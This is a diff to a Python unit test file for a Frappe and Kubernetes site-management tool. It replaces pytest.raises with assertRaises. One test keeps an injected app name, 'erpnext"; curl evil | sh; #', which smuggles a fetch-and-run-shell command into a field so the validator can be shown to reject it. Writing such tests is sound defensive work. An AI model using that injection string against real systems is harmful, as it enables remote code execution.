@@ -4,7 +4,7 @@
 from types import SimpleNamespace
 from unittest.mock import MagicMock
 
-import pytest
+
 from frappe.tests import UnitTestCase
 
 from kubeport.tasks.site_tasks import (
@@ -72,13 +72,13 @@ class UnitTestSiteHelpers(UnitTestCase):
 		)
 
 	def test_parse_install_apps_rejects_shell_metacharacters(self):
-		with pytest.raises(ValueError):
+		with self.assertRaises(ValueError):
 			_parse_install_apps('erpnext"; curl evil | sh; #')
 
 	def test_parse_install_apps_rejects_uppercase_and_spaces(self):
-		with pytest.raises(ValueError):
+		with self.assertRaises(ValueError):
 			_parse_install_apps("ERPNext")
-		with pytest.raises(ValueError):
+		with self.assertRaises(ValueError):
 			_parse_install_apps("erp next")
 
 	def test_parse_install_apps_returns_empty_on_none_or_whitespace(self):
@@ -291,7 +291,7 @@ class UnitTestClonePodSpec(UnitTestCase):
 		self.assertNotIn("not-referenced", vol_names)
 
 	def test_clone_raises_when_sites_mount_is_missing(self):
-		with pytest.raises(RuntimeError):
+		with self.assertRaises(RuntimeError):
 			_clone_reference_pod_spec(self._fake_api_client(), self._ref_pod(False))
 
 
@@ -930,7 +930,7 @@ class UnitTestControllerValidation(UnitTestCase):
 			mock_frappe.throw.side_effect = Exception("validation error")
 
 			doc.is_new = lambda: True
-			with pytest.raises(Exception, match="validation error"):
+			with self.assertRaises(Exception):
 				doc.validate()
 
 			# frappe.throw should have been called with a message about the status
